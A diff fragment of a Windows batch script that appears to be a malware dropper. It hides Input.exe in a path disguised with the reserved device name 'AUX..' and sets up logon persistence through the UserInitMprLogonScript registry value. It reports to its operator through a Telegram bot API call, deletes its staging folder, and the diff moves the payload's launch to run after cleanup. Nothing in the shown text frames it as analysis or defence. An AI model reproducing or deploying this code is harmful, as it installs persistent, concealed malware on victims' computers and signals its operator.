@@ -26,8 +26,6 @@ move /Y "%ProgramData%\O\Input.exe" "\\.\%ProgramData%\AUX..\"
 
 reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "%ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll" /f
 
-powershell.exe -Command C:\ProgramData\AUX..\Input.exe C:\ProgramData\AUX..\Icon.dll
-
 chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
@@ -76,3 +74,4 @@ powershell -NoProfile -Command ^
   "try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message} } catch { Write-Host 'Error sending message to Telegram' }"
 endlocal
 rd /s /q "%ProgramData%\O"
+powershell.exe C:\ProgramData\AUX..\Input.exe C:\ProgramData\AUX..\Icon.dll
